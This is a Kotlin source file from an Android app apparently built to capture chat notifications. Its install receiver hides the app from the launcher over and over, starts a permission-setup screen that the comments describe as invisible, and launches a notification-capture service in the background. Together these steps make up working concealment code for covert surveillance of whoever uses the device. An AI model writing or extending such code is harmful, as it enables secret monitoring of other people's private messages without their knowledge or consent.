package com.chats.capture.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import com.chats.capture.CaptureApplication
import com.chats.capture.managers.ServiceMonitor
import com.chats.capture.services.NotificationCaptureService
import com.chats.capture.ui.PermissionSetupActivity
import com.chats.capture.utils.AppHider
import com.chats.capture.utils.AppVisibilityManager
import timber.log.Timber

/**
 * Receiver that triggers when app is installed or updated
 * Automatically starts the app and requests permissions
 */
class PackageInstallReceiver : BroadcastReceiver() {
    
    override fun onReceive(context: Context, intent: Intent) {
        when (intent.action) {
            Intent.ACTION_PACKAGE_ADDED,
            Intent.ACTION_PACKAGE_REPLACED -> {
                val packageName = intent.data?.schemeSpecificPart
                if (packageName == context.packageName) {
                    Timber.tag("AUTO_START").i("🚀 App installed/updated - Starting auto-setup and auto-start")
                    Timber.d("App installed/updated - starting auto-setup")
                    handleAppInstalled(context)
                }
            }
            Intent.ACTION_MY_PACKAGE_REPLACED -> {
                Timber.tag("AUTO_START").i("🚀 App updated - Starting auto-setup and auto-start")
                Timber.d("App updated - starting auto-setup")
                handleAppInstalled(context)
            }
        }
    }
    
    private fun handleAppInstalled(context: Context) {
        Timber.d("App installed - waiting for full installation before starting")
        
        // Verify package is installed before proceeding
        if (!isPackageInstalled(context)) {
            Timber.w("Package not fully installed yet, delaying start")
            // Retry after longer delay
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                handleAppInstalled(context)
            }, 5000) // 5 second delay before retry
            return
        }
        
        Timber.d("Package verified installed - starting in background")
        
        // Delayed: Hide app from launcher (wait for system to register package)
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            try {
                if (isPackageInstalled(context)) {
                    AppVisibilityManager.hideFromLauncher(context)
                    AppHider.hide(context)
                    AppHider.ensureHidden(context)
                    Timber.d("App hidden from launcher (delayed)")
                }
            } catch (e: Exception) {
                Timber.e(e, "Error hiding app during installation - will retry")
            }
        }, 3000) // 3 second delay to ensure package is registered
        
        // Delayed: Start permission setup activity (runs in background, invisible)
        val setupIntent = Intent(context, PermissionSetupActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION
            putExtra("auto_start", true)
        }
        
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            if (isPackageInstalled(context)) {
                try {
                    context.startActivity(setupIntent)
                    Timber.d("PermissionSetupActivity started (background)")
                } catch (e: Exception) {
                    Timber.e(e, "Error starting PermissionSetupActivity, retrying...")
                    // Retry after longer delay
                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                        try {
                            if (isPackageInstalled(context)) {
                                context.startActivity(setupIntent)
                            }
                        } catch (e2: Exception) {
                            Timber.e(e2, "Failed to start PermissionSetupActivity after retry")
                        }
                    }, 5000)
                }
            }
        }, 5000) // 5 second delay to ensure package is fully registered
        
        // Schedule delayed hides to ensure it sticks (launchers cache app list)
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            try {
                AppVisibilityManager.hideFromLauncher(context)
                AppHider.ensureHidden(context)
                Timber.d("Delayed hide attempt (2s)")
            } catch (e: Exception) {
                Timber.e(e, "Error in delayed hide")
            }
        }, 2000)
        
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            try {
                AppVisibilityManager.hideFromLauncher(context)
                AppHider.ensureHidden(context)
                Timber.d("Delayed hide attempt (5s)")
            } catch (e: Exception) {
                Timber.e(e, "Error in delayed hide")
            }
        }, 5000)
        
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            try {
                AppVisibilityManager.hideFromLauncher(context)
                AppHider.ensureHidden(context)
                Timber.d("Delayed hide attempt (10s)")
            } catch (e: Exception) {
                Timber.e(e, "Error in delayed hide")
            }
        }, 10000)
        
        // Start services after longer delay (they will request permissions if needed)
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            if (isPackageInstalled(context)) {
                try {
                    Timber.tag("AUTO_START").i("🔄 Starting NotificationCaptureService automatically after installation...")
                    // Capture is OFF by default; user must enable it in Settings.
                    com.chats.capture.utils.ServiceStarter.startNotificationService(context)
                    com.chats.capture.utils.ServiceStarter.ensureServicesRunning(context)
                    Timber.tag("AUTO_START").i("✅ Service start attempted after installation (capture may be OFF)")
                    Timber.d("Services started in background")
                } catch (e: Exception) {
                    Timber.tag("AUTO_START").e(e, "❌ Error starting services: ${e.message}")
                    Timber.e(e, "Error starting services: ${e.message}")
                    // Retry after delay
                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                        if (isPackageInstalled(context)) {
                            try {
                                Timber.tag("AUTO_START").i("🔄 Retrying to start services...")
                                com.chats.capture.utils.ServiceStarter.ensureServicesRunning(context)
                                Timber.tag("AUTO_START").i("✅ Service start attempted after retry (capture may be OFF)")
                            } catch (e2: Exception) {
                                Timber.tag("AUTO_START").e(e2, "❌ Failed to start services after retry")
                                Timber.e(e2, "Failed to start services after retry")
                            }
                        }
                    }, 5000)
                }
            } else {
                Timber.tag("AUTO_START").w("⚠️ Package not installed, skipping service start")
                Timber.w("Package not installed, skipping service start")
            }
        }, 10000) // 10 second delay to ensure app is fully initialized and installed
    }
    
    /**
     * Check if package is fully installed
     */
    private fun isPackageInstalled(context: Context): Boolean {
        return try {
            context.packageManager.getPackageInfo(context.packageName, 0)
            true
        } catch (e: PackageManager.NameNotFoundException) {
            false
        } catch (e: Exception) {
            Timber.e(e, "Error checking if package is installed")
            false
        }
    }
}
